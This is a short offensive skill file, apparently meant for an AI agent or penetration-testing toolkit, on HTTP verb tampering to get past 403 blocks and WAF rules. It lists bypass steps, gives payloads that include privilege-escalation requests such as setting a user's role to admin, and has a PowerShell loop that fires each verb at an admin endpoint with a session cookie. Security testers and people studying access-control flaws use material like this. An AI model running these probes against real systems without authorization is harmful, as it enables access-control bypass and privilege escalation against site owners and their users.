---
name: verb-tampering
description: HTTP verb tampering — using non-standard or case-varied methods to bypass access controls and WAFs (GET/POST/PUT/PATCH/TRACE/OPTIONS/XGET/REPORT). Use when 403 blocks a resource but the app handles alternative verbs.
category: api
---

# HTTP Verb Tampering

## Detection
- 403/405 on a sensitive path for the "obvious" verb → try other verbs.
- Many frameworks allow: `XGET`, `REPORT`, `TRACK`, `PATCH`, `SEARCH`, `PROPFIND`, `MKCOL`, `OPTIONS`, custom verbs; PHP only blocks GET/POST → `PUT /admin/users` works.

## Exploitation
1. **ACL bypass**: WAF or server rule blocks `GET /admin/*` but allows `POST`/`PATCH` → call with alternate verb.
2. **Method confusion**: `GET` blocked but `HEAD` allowed (HEAD triggers GET handler) → sensitive data via HEAD? (rare); `TRACE` reflects (XST).
3. **Custom verb trick**: `XGET /api/users`, `REPORT /admin/users`.
4. **Case/whitespace**: `/admin/users` vs `/Admin/users` vs `/admin/users/` vs `/admin//users` vs `//admin/users` — different route matching.
5. **Multipart/form method**: send `POST` with `X-HTTP-Method-Override: PUT`.

## Payloads
```
OPTIONS /admin/users
PATCH  /admin/users  {"role":"admin"}
XGET   /admin/users
REPORT /admin/users
PUT    /admin/users/1  {"role":"admin"}
X-HTTP-Method-Override: PUT
```

## Tool Commands (Windows)
```powershell
$verbs = @("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "XGET", "REPORT", "PROPFIND", "TRACE")
foreach ($m in $verbs) {
    $code = curl.exe -s -o NUL -w "%{http_code}" -X "$m" "$U/admin/users" -H 'Cookie: sess=...'
    Write-Host "$m $code"
}
```

## Verification & Evidence
- Sensitive action executes with a verb/route the server was not meant to allow.
- Capture the successful verb + request/response.